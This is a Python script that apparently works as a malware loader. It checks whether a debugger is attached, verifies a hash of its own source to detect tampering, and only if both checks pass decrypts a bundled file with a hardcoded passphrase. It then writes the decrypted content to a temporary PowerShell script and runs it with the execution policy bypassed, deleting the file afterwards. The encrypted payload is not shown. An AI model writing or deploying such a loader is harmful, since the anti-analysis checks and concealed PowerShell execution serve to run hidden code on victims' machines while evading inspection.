import hashlib
import hmac
import subprocess
import tempfile
import os
import time
import sys
gotthatdocterpepp = False

wrong_result = None

if sys.gettrace():
    gotthatdocterpepp = True


pingpong = b"# wsgbro"

def bingbong():
    global gotthatdocterpepp

    with open(sys.argv[0], "rb") as f:
        content = f.read()

    if pingpong not in content:
        gotthatdocterpepp = True
        return

    parts = content.split(pingpong)
    if len(parts) != 2:
        gotthatdocterpepp = True
        return

    code, stored_hash = content.split(pingpong)

    stored_hash = stored_hash.strip().strip(b'"')

    actual_hash = hashlib.sha256(code).hexdigest().encode()

    if actual_hash != stored_hash:
        gotthatdocterpepp = True

bingbong()

ENCRYPTED_FILE = "lemonpresident.enc"
PASSPHRASE = "lemon president"
OUTPUT_EXTENSION = ".ps1"

NONCE_BYTES = 12
HMAC_BYTES = 32
CHUNK_SIZE = 4096

def hkdf(passphrase, salt, info=b"", length=64):
    prk = hmac.new(salt, passphrase.encode(), hashlib.sha256).digest()
    okm = b""
    t = b""
    counter = 1
    while len(okm) < length:
        t = hmac.new(prk, t + info + bytes([counter]), hashlib.sha256).digest()
        okm += t
        counter += 1
    return okm[:length]


def keystream_generator(enc_key, nonce):
    state = hashlib.sha256(enc_key + nonce).digest()
    while True:
        for b in state:
            yield b
        state = hashlib.sha256(state).digest()


def run_powershell_script(path):
    subprocess.run([
        "powershell",
        "-NoProfile",
        "-ExecutionPolicy", "Bypass",
        "-File", path
    ], check=True)


def decrypt_and_open():
    
    with open(ENCRYPTED_FILE, "rb") as f:
        nonce = f.read(NONCE_BYTES)
        data = f.read()

    if gotthatdocterpepp:
        return wrong_result

    ciphertext = data[:-HMAC_BYTES]
    tag = data[-HMAC_BYTES:]

    key_material = hkdf(PASSPHRASE, nonce, info=b"file-encryption", length=64)
    enc_key = key_material[:32]
    mac_key = key_material[32:]

    mac = hmac.new(mac_key, nonce, hashlib.sha256)
    mac.update(ciphertext)

    if not hmac.compare_digest(mac.digest(), tag):
        raise RuntimeError("Authentication failed")

    stream = keystream_generator(enc_key, nonce)

    fd, temp_path = tempfile.mkstemp(suffix=OUTPUT_EXTENSION)
    os.close(fd)

    with open(temp_path, "wb") as out:
        for i in range(0, len(ciphertext), CHUNK_SIZE):
            chunk = ciphertext[i:i + CHUNK_SIZE]
            out.write(bytes(b ^ next(stream) for b in chunk))

    try:
        run_powershell_script(temp_path)
    finally:
        os.remove(temp_path)


if __name__ == "__main__":
    decrypt_and_open()


# wsgbro
"96c82e17244ddb3ee3791cdd83643c5e2d832be7e23d74b3f3e9a4a1f1fe75b6"
